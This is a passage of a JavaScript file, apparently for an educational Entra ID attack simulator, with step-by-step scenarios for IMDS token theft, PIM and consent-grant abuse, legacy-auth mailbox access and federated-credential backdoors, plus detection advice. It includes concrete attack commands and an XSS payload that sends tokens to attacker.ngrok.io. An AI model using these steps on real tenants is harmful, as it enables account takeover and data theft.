  },
  {
    logMessage: "DETECTION: Entra Audit Log event 'Update application — Add password credentials' is high signal. Any credential addition to an existing app should trigger an immediate alert. Microsoft Defender for Cloud Apps: App governance policy 'Alert on new credential added to app with sensitive permissions'. Identity Secure Score: 'App admins should not be Global Admins'.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Fully autonomous persistent backdoor. Client secret survives: user password resets, MFA changes, account disables, PIM deactivations, CA policy updates. No interactive sign-in — fully headless. Root cause: RoleManagement.ReadWrite.Directory application permission is a direct Global Admin escalation primitive.",
    logType: "attack",
    action: () => highlightElement("ent_svc"),
  },
];

// ── 10. IMDS Credential Theft ─────────────────────────────────────
export const entraIMDSCredTheftScenario = [
  {
    scenarioName: "Attack: IMDS Credential Theft via SSRF / RCE on Azure Workload",
    logMessage: "Attacker Goal: Exploit SSRF or RCE on an Azure-hosted workload to query the Instance Metadata Service (IMDS) and steal the Managed Identity token — lateral movement to Azure resources via Azure RBAC.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker has achieved SSRF or RCE on the Azure workload hosting AppReg-01 / WebApp-MI (ent_svc). The workload has system-assigned Managed Identity (ent_mi) with 'Key Vault Secrets User' role on corp-kv and 'Reader' on subscription.",
    logType: "setup",
    action: () => { highlightElement("ent_svc", stepDelay, "compromised"); highlightElement("ent_mi"); },
  },
  {
    logMessage: "Attacker (via SSRF/RCE): curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net'. IMDS is link-local (169.254.x.x) — unreachable from internet, only from within the VM. No auth required.",
    logType: "imds",
    action: () => addTemporaryEdge("ent_svc", "ent_mi", "imds", "steal MI token (SSRF)"),
  },
  {
    logMessage: "IMDS → Attacker: 200 OK { access_token: 'eyJ0eXAiOiJKV1Q...', token_type: 'Bearer', expires_in: 3599, resource: 'https://vault.azure.net', client_id: <MI_clientId>, object_id: <MI_principalId>, expires_on: <unix_ts> }. Valid Bearer token for Key Vault data-plane.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_mi", "ent_attacker", "imds", "MI token (vault.azure.net)"),
  },
  {
    logMessage: "Attacker → Key Vault: GET https://corp-kv.vault.azure.net/secrets?api-version=7.4 (Authorization: Bearer <MI_token>). Lists all secret names. GET /secrets/{name}/{version} for each → retrieves plaintext values: db-connstr, stripe-api-key, ssh-private-key, mssql-sa-password.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "GET /secrets/* (MI token)"),
  },
  {
    logMessage: "Key Vault: Validates JWT — aud=vault.azure.net ✓, iss ✓, exp ✓. Azure RBAC: MI principal → 'Key Vault Secrets User' role on this vault ✓. All secrets returned. No password, no API key needed by attacker — just network access to IMDS endpoint.",
    logType: "attack",
    action: () => highlightElement("ent_kv", stepDelay, "compromised"),
  },
  {
    logMessage: "Attacker escalates: GET http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com. If MI has 'Contributor' or 'Reader' on subscription — GET /subscriptions/{subId}/resources → enumerate all Azure resources.",
    logType: "imds",
    action: () => addTemporaryEdge("ent_svc", "ent_mi", "imds", "ARM token req"),
  },
  {
    logMessage: "Attacker → Azure ARM: GET https://management.azure.com/subscriptions/{subId}/resources?api-version=2023-07-01 (MI ARM token). Returns all VMs, storage accounts, databases, container registries, AKS clusters — full subscription inventory for further lateral movement.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "ARM /subscriptions enum"),
  },
  {
    logMessage: "DETECTION: Azure Defender for Key Vault: 'Unusual access to Key Vault' alert on first IMDS-sourced access from new IP. Azure Monitor: KV diagnostic logs → Log Analytics: alert on secret read spike. Defense: scope MI role to specific secret names (not entire vault), enable 'Key Vault firewall' restricting to known subnets.",
    logType: "info",
    action: () => highlightElement("ent_mi"),
  },
  {
    logMessage: "IMPACT: SSRF to IMDS is the Azure equivalent of LSASS credential theft on-prem. MI tokens continuously available from IMDS — no expiry friction (renewed automatically). Over-privileged MI is the most common Azure misconfiguration in cloud IR cases. Compromise of one workload cascades to full subscription via unconstrained MI role assignments.",
    logType: "attack",
    action: () => { highlightElement("ent_kv"); highlightElement("ent_mi"); },
  },
];

// ── 11. PIM Eligible Role Activation — Account Takeover → GA ─────
export const entraPIMTakeoverScenario = [
  {
    scenarioName: "Attack: PIM Takeover — Compromised Account → Global Admin Escalation",
    logMessage: "Attacker Goal: After compromising EntraAdmin's session, activate their PIM-eligible Global Administrator assignment to obtain tenant-wide GA privileges, then establish persistent backdoor before PIM window closes.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker holds EntraAdmin (ent_admin) session token (access_token + refresh_token) — obtained via MFA fatigue, AITM, or device code phishing. EntraAdmin has GlobalAdministrator PIM-eligible assignment. PIM policy: no approval required, MFA required, max duration 8h.",
    logType: "setup",
    action: () => highlightElement("ent_admin", stepDelay, "compromised"),
  },
  {
    logMessage: "Attacker → Entra PIM API (as EntraAdmin): GET /beta/privilegedAccess/aadRoles/resources/{tenantId}/roleAssignments?$filter=subjectId eq '{adminObjectId}'&$expand=roleDefinition. Confirms: GlobalAdministrator eligible, maxActivationDuration: PT8H, approvalRequired: false.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET PIM eligible roles"),
  },
  {
    logMessage: "Attacker → Entra PIM: POST /beta/privilegedAccess/aadRoles/roleAssignmentRequests { roleDefinitionId: '62e90394-...', type: UserAdd, assignmentState: Active, justification: 'Routine maintenance INC-0042', scheduleInfo: { duration: PT8H } }.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "POST PIM activate GA"),
  },
  {
    logMessage: "Entra PIM: approvalRequired=false ✓ (no approval gate). MFA required: yes — checks current session token for recent MFA claim. If attacker holds session from MFA fatigue/AITM (amr includes 'mfa', <1h old), MFA step-up satisfied from session context. No new push triggered.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "MFA claim accepted"),
  },
  {
    logMessage: "Entra PIM: GlobalAdministrator active for 8h. Audit log written: { actor: EntraAdmin, operation: 'Add member to role', role: GlobalAdministrator, timestamp }. Attacker's next access_token (refresh_token exchange) includes 'wids': ['62e90394-...'] claim.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "GA wids token (8h)"),
  },
  {
    logMessage: "Attacker (Global Admin, 8h window): POST /v1.0/users → creates backdoor account 'svc-monitoring@corp.onmicrosoft.com' with strong password + MFA registered on attacker device. POST /v1.0/roleManagement/directory/roleAssignments → assigns GlobalAdministrator (standing, NOT PIM) to new account.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "create standing GA backdoor"),
  },
  {
    logMessage: "Attacker: Also adds client secret to highest-privilege app registration (AppReg-01) for fully autonomous, user-independent persistence. Two backdoors established within 4 minutes of GA activation.",
    logType: "attack",
    action: () => { highlightElement("ent_svc", stepDelay, "compromised"); highlightElement("ent_tenant"); },
  },
  {
    logMessage: "DETECTION: Entra Audit log correlation: PIM activation + new user creation + standing role assignment within same session = high-confidence incident. Microsoft Sentinel rule: 'PIM role activation followed by privileged operations (T1098.003)'. Fix: require approval for GA PIM activation — breaks entire chain.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: PIM without approval for Global Admin is operationally equivalent to standing GA. Attacker established standing GA backdoor account + SP credential backdoor within the 8h PIM window. Both persist after window closes, password reset on original admin, and all session revocations.",
    logType: "attack",
    action: () => highlightElement("ent_admin"),
  },
];

// ══════════════════════════════════════════════════════════════════
//  PERSISTENCE & IMPACT
// ══════════════════════════════════════════════════════════════════

// ── 12. Illicit Consent Grant ─────────────────────────────────────
export const entraIllicitConsentScenario = [
  {
    scenarioName: "Attack: Illicit Consent Grant — Persistent High-Privilege App (Tenant-Wide)",
    logMessage: "Attacker Goal: Obtain persistent OAuth2 access to all tenant users' M365 data by registering a malicious multi-tenant app and harvesting consent grants — access survives password resets indefinitely.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attacker registers multi-tenant app in attacker Entra tenant (signInAudience: AzureADMultipleOrgs). Configured permissions: delegated Mail.Read, Files.ReadWrite.All, offline_access (user-consentable). Application: Mail.Read, User.Read.All (admin consent required). Publisher: not verified.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Wave 1 — User phishing: 340 users receive 'HR Self-Service portal' phish. Consent URL scope: Mail.Read+Files.ReadWrite.All+offline_access. Users approve — delegated grants created per user. Each generates a 90-day offline_access refresh_token for the attacker.",
    logType: "attack",
    action: () => { highlightElement("ent_user1"); highlightElement("ent_user2"); },
  },
  {
    logMessage: "Alice consents → Entra ID creates oauth2PermissionGrant (consentType=Principal, principalId=alice). Auth code → attacker redirect_uri. POST /token → { access_token (Mail.Read, 1h), refresh_token (90d) }. Background job stores token keyed to alice@corp.",
    logType: "oidc",
    action: () => { addTemporaryEdge("ent_user1", "ent_tenant", "oidc", "user consent (alice)"); addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "alice token (90d)"); },
  },
  {
    logMessage: "Wave 2 — Admin phishing: EntraAdmin receives targeted phish for Application Permissions consent (admin-only). Approves → tenant-wide admin consent created (consentType=AllPrincipals). Application permission Mail.Read + User.Read.All granted for ALL users, not just admin.",
    logType: "oidc",
    action: () => { addTemporaryEdge("ent_admin", "ent_tenant", "oidc", "ADMIN consent (all users)"); highlightElement("ent_admin", stepDelay, "compromised"); },
  },
  {
    logMessage: "Attacker: POST /token { grant_type=client_credentials } with app secret → access_token with Mail.Read application permission (aud=graph.microsoft.com, roles=[Mail.Read, User.Read.All]). Can now read mail of ANY user without individual consent or refresh_token.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "app token (all users)"),
  },
  {
    logMessage: "Attacker: GET https://graph.microsoft.com/v1.0/users (User.Read.All) → 340 users. For each: GET /users/{id}/messages?$select=subject,body,from,receivedDateTime&$top=50 (Mail.Read application permission). Full tenant email stream read — no individual tokens needed.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "msgraph", "mail exfil (all 340 users)"),
  },
  {
    logMessage: "Attacker's refresh_tokens (delegated, per-user): silently renewed every 90 days. Password changes do NOT invalidate refresh_tokens (only explicit token revocation does). 47 individual users' tokens active + admin consent app token for all users = full persistent coverage.",
    logType: "attack",
    action: () => { highlightElement("ent_user1"); highlightElement("ent_user2"); },
  },
  {
    logMessage: "REMEDIATION: Restrict user consent via Entra consent settings (App consent policies → allow only verified publisher + low-risk permissions). Admin consent workflow: requires ticket approval. Revocation: Entra portal → Enterprise Applications → revoke all consent grants → delete app. Check: GET /v1.0/oauth2PermissionGrants and /v1.0/servicePrincipals/{id}/appRoleAssignments regularly.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Persistent, stealthy, password-independent access. No malware, no persistent agent — pure OAuth2 abuse. Admin consent elevates to all current AND future users added to tenant. App persists in Enterprise Applications until explicitly removed. Most frequent finding in Microsoft DART cloud incident response engagements.",
    logType: "attack",
    action: () => highlightElement("ent_svc"),
  },
];

// ══════════════════════════════════════════════════════════════════
//  INITIAL ACCESS — LEGACY AUTH PROTOCOL ABUSE
// ══════════════════════════════════════════════════════════════════

// ── 13. Legacy Auth Protocol Abuse (SMTP AUTH / EWS / IMAP / ActiveSync) ──────
export const entraLegacyAuthAbuseScenario = [
  {
    scenarioName: "Attack: Legacy Auth Protocol Abuse — Direct Mailbox Auth (MFA Bypass)",
    logMessage: "Attacker Goal: Authenticate directly to Exchange Online mailboxes using legacy protocols (SMTP AUTH, EWS Basic Auth, IMAP, POP3, ActiveSync). Legacy auth bypasses Entra ID Conditional Access entirely — no MFA prompt generated.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Recon: AzureHound CA policy dump shows 'Block legacy auth' policy is NOT applied to the 'Sync accounts' group. Tenant admin re-enabled SMTP AUTH for shared mailboxes. GET /beta/identity/conditionalAccessPolicies — confirms legacy auth exclusions and exempted users.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "CA policy enum"),
  },
  {
    logMessage: "Check per-user SMTP AUTH state via EXO PowerShell: Get-CASMailbox alice@corp -SmtpClientAuthenticationDisabled → $false. Legacy protocol matrix: SMTP AUTH (port 587) ✓ active, EWS ✓ active, IMAP4 ✓ active, ActiveSync ✓ active. No per-protocol block applied.",
    logType: "info",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "SMTP AUTH attack: openssl s_client -connect smtp.office365.com:587 -starttls smtp → EHLO → AUTH LOGIN → Base64(alice@corp.com) + Base64(Spring2024!) submitted. Exchange Online accepts credentials directly — Entra ID NOT consulted. Zero MFA, zero CA policy, zero sign-in risk evaluation.",
    logType: "http",
    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "http", "SMTP AUTH (STARTTLS)"),
  },
  {
    logMessage: "Exchange Online: '235 2.7.0 Authentication successful'. Attacker sends spear-phish as alice@corp.com: MAIL FROM:<alice@corp.com> → RCPT TO:<cfo@corp.com> → DATA: [BEC invoice fraud payload]. Internal sender — bypasses all external sender warnings and SPF/DKIM checks.",
    logType: "attack",
    action: () => { highlightElement("ent_m365"); highlightElement("ent_user1", undefined, "compromised"); },
  },
  {
    logMessage: "EWS Basic Auth attack: POST https://outlook.office365.com/EWS/Exchange.asmx (Authorization: Basic <base64(alice@corp:Spring2024!)>). SOAP GetFolder request. Exchange validates Basic credential directly against stored hash — Entra CA not in path. Returns full XML mailbox response.",
    logType: "http",
    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "http", "EWS Basic Auth"),
  },
  {
    logMessage: "Via EWS: reads inbox (FindItem), calendar (all meetings including exec boardroom bookings), contacts. Sets persistent forwarding rule via EWS UpdateInboxRules: all mail with 'invoice' or 'payment' CC'd to attacker mailbox. No Entra logs. EWS access logged only in Exchange Unified Audit Log (if enabled, not default in all SKUs).",
    logType: "attack",
    action: () => highlightElement("ent_m365"),
  },
  {
    logMessage: "IMAP4 attack: openssl s_client -connect outlook.office365.com:993 → A1 AUTHENTICATE PLAIN <base64(\\x00alice@corp.com\\x00Spring2024!)>. Response: A1 OK AUTHENTICATE completed. Access all IMAP folders, download entire mailbox. No Entra sign-in event generated.",
    logType: "http",
    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "http", "IMAP AUTHENTICATE PLAIN"),
  },
  {
    logMessage: "Telemetry gap assessment: Entra ID Sign-In logs: ZERO entries for all attacks. Exchange Unified Audit Log: MailItemsAccessed events present — but UAL requires E3/E5 license and is not enabled by default. Identity Protection: no risk events (no Entra auth path taken). SOC alerted? No.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Full mailbox compromise (read/send/forward/delete) without triggering a single Entra Conditional Access evaluation or sign-in log entry. MFA is entirely irrelevant for legacy auth paths — MFA is an Entra ID control, not an Exchange control. Root cause: legacy auth is a parallel authentication path. Mitigation: Set-AuthenticationPolicy to block Basic Auth per-protocol for all users, enforce via CA 'Block legacy auth' policy with ZERO exclusions.",
    logType: "attack",
    action: () => { highlightElement("ent_m365"); highlightElement("ent_user1"); },
  },
];

// ══════════════════════════════════════════════════════════════════
//  TOKEN & SESSION — IMPLICIT FLOW TOKEN HARVEST
// ══════════════════════════════════════════════════════════════════

// ── 14. OAuth2 Implicit Flow — Access Token Harvest via URL Fragment ──────────
export const entraImplicitTokenHarvestScenario = [
  {
    scenarioName: "Attack: OAuth2 Implicit Flow — Access Token Harvest (URL Fragment / XSS / Referrer)",
    logMessage: "Attacker Goal: Extract Entra ID access tokens from legacy SPA applications using the deprecated OAuth2 implicit grant flow. Tokens returned in the URL fragment (#access_token=...) — exposed to browser history, referrer headers, and any JavaScript executing in the page.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Identify target SPA: corp-portal.corp.com. App registration recon: GET /v1.0/applications/{appId}?$select=web → web.implicitGrantSettings.enableAccessTokenIssuance=true. Implicit flow enabled — tokens returned in URL fragment rather than via secure back-channel POST /token.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "app implicit grant check"),
  },
  {
    logMessage: "Alice authenticates normally to corp-portal: GET https://login.microsoftonline.com/.../authorize?response_type=token+id_token&scope=openid+Mail.Read&redirect_uri=https://corp-portal.corp.com/auth/callback. Completes password + MFA. Entra redirects.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_dev1", "ent_tenant", "oidc", "GET /authorize (implicit)"),
  },
  {
    logMessage: "Entra ID → Browser: HTTP 302 Location: https://corp-portal.corp.com/auth/callback#access_token=eyJ0eXAiOiJKV1Q...&token_type=Bearer&expires_in=3600&scope=Mail.Read&id_token=eyJ0eXA.... Token is in the URL FRAGMENT — browser stores full URL in history. Fragment sent to page JavaScript via window.location.hash, never transmitted to server.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_tenant", "ent_dev1", "oidc", "302 → #access_token"),
  },
  {
    logMessage: "Attack Vector A — Browser History Extraction: Malware/LotL reads browser history SQLite DB (e.g., %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History). SQL: SELECT url FROM urls WHERE url LIKE '%access_token%'. Recovers full URL with JWT. Token valid 1h from issuance.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attack Vector B — Referrer Header Leak: corp-portal.corp.com includes Google Analytics (<script src='https://www.googletagmanager.com/...'/>). Browser includes Referer: https://corp-portal.corp.com/auth/callback#access_token=eyJ0... header in request to GTM CDN. Access token sent in cleartext to third-party analytics.",
    logType: "http",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attack Vector C — XSS Token Exfil: Stored XSS in corp-portal comment field. Payload: <img src=x onerror=\"fetch('https://attacker.ngrok.io/?t='+encodeURIComponent(window.location.hash+sessionStorage.getItem('msal.token')))\">. Captures both URL fragment token AND any MSAL-cached tokens from sessionStorage.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_dev1", "http", "XSS → hash + storage exfil"),
  },
  {
    logMessage: "Attacker replays stolen access_token: GET https://graph.microsoft.com/v1.0/me/messages (Authorization: Bearer <stolen_AT>). MS Graph: validates JWT — aud=graph.microsoft.com ✓, scp=Mail.Read ✓, exp not reached ✓. Returns Alice's inbox. 1h window: sufficient for email exfil + directory recon.",
    logType: "msgraph",
    action: () => { addTemporaryEdge("ent_attacker", "ent_m365", "msgraph", "GET /me/messages (stolen)"); highlightElement("ent_user1", undefined, "compromised"); },
  },
  {
    logMessage: "Key constraint: implicit flow does NOT issue refresh_tokens (RFC 6749 §4.2, by design). Attacker has 1h window per token. However: re-triggering the authorize endpoint with prompt=none silently issues new access_token if session cookie active. Attacker can loop prompt=none requests from iframe to harvest fresh tokens indefinitely.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "prompt=none silent re-auth"),
  },
  {
    logMessage: "IMPACT: Implicit flow exposes access tokens to any JavaScript on the page, browser extensions, history, and referrer-receiving third parties — the attack surface is every line of JavaScript and every HTTP link. MSAL.js v2+ (auth code + PKCE) eliminates this by issuing tokens via back-channel POST only. Mitigation: disable enableAccessTokenIssuance in app registration, migrate to MSAL.js 2.x PKCE flow. Entra now warns in portal when implicit flow is enabled.",
    logType: "attack",
    action: () => highlightElement("ent_dev1"),
  },
];

// ══════════════════════════════════════════════════════════════════
//  PRIVILEGE ESCALATION — WORKLOAD IDENTITY FEDERATION ABUSE
// ══════════════════════════════════════════════════════════════════

// ── 15. Workload Identity Federation Abuse (OIDC Federated Credential Backdoor) ─
export const entraWIFAbuseScenario = [
  {
    scenarioName: "Attack: Workload Identity Federation Abuse — Secretless Persistent Backdoor via External OIDC",
    logMessage: "Attacker Goal: Add an OIDC federated identity credential to a high-privilege app registration. An attacker-controlled external OIDC provider (GitHub Actions) can then exchange its tokens for Entra SP tokens — no client secret required, no credential to scan or rotate.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker holds Application Administrator session (or is Owner of AppReg-01). Target: AppReg-01 has Application Permission RoleManagement.ReadWrite.Directory — direct Global Admin escalation primitive. WIF allows external OIDC IdPs to vouch for app identity without a stored secret.",
    logType: "setup",
    action: () => { highlightElement("ent_admin", undefined, "compromised"); highlightElement("ent_svc"); },
  },
  {
    logMessage: "Attacker creates GitHub repo: github.com/attacker-org/infra-sync (private). GitHub's OIDC provider issues JWTs per workflow run: iss=https://token.actions.githubusercontent.com, sub=repo:attacker-org/infra-sync:ref:refs/heads/main, aud=<configurable>. Token signed with GitHub's OIDC keys (JWKS published publicly).",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attacker → MS Graph (as App Admin): POST /v1.0/applications/{AppReg01_objectId}/federatedIdentityCredentials { name: 'github-infra-sync', issuer: 'https://token.actions.githubusercontent.com', subject: 'repo:attacker-org/infra-sync:ref:refs/heads/main', audiences: ['api://AzureADTokenExchange'] }. Returns 201 Created.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "POST /federatedIdentityCredentials"),
  },
  {
    logMessage: "Audit event written: 'Update application — Add federated identity credential'. No client_secret created. No password. Credential scanners (GitLeaks, TruffleHog, Defender CSPM) find no secrets to alert on — FIC is a trust relationship, not a credential string. Zero byte secret footprint.",
    logType: "attack",
    action: () => highlightElement("ent_svc", undefined, "compromised"),
  },
  {
    logMessage: "Attacker triggers GitHub Actions workflow (github.com/attacker-org/infra-sync/.github/workflows/sync.yml, permissions: id-token: write). GitHub OIDC issues signed JWT to workflow environment: {iss, sub=repo:attacker-org/infra-sync:ref:refs/heads/main, aud=api://AzureADTokenExchange, jti}.",
    logType: "oidc",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "GitHub Action → Entra ID: POST /oauth2/v2.0/token { client_id: <AppReg01_appId>, client_assertion_type: urn:ietf:params:oauth:client-assertion-type:jwt-bearer, client_assertion: <GitHub_OIDC_JWT>, grant_type: client_credentials, scope: https://graph.microsoft.com/.default }.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "WIF token exchange (GitHub→Entra)"),
  },
  {
    logMessage: "Entra ID WIF validation: fetches GitHub's public JWKS (https://token.actions.githubusercontent.com/.well-known/openid-configuration → jwks_uri). Validates JWT signature, issuer, subject, audience against registered FIC entry. All match → issues access_token for AppReg-01 SP.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "SP access_token (roles: RoleManagement.RW)"),
  },
  {
    logMessage: "Attacker (via GitHub Actions scheduled cron: '0 */6 * * *'): POST /v1.0/roleManagement/directory/roleAssignments { principalId: <attacker_SP>, roleDefinitionId: '62e90394-...' (GlobalAdministrator) }. GA assigned every 6h. If removed by defenders, workflow re-assigns within 6h automatically.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "POST /roleAssignments (GA, cron)"),
  },
  {
    logMessage: "DETECTION: Entra Audit Log shows 'Add federated identity credential' at creation — one event, easy to miss. Subsequent WIF token issuances appear as normal SP auth events. FIC not visible in 'Certificates & secrets' portal blade — requires navigating to 'Federated credentials' tab or GET /applications/{id}/federatedIdentityCredentials. Defender for Cloud Apps App Governance: alert on 'New federated credential added to privileged app'.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Secretless, rotation-proof, scanner-invisible, self-healing persistent backdoor. Removes a GitHub repo's authentication cost (no secrets to protect). Persists through: client secret rotation, certificate rotation, password changes, MFA resets. Removal requires finding and deleting the FIC entry specifically. Increasingly used by nation-state actors as post-compromise persistence on cloud-native workloads.",
    logType: "attack",
    action: () => { highlightElement("ent_svc"); highlightElement("ent_tenant"); },
  },
];
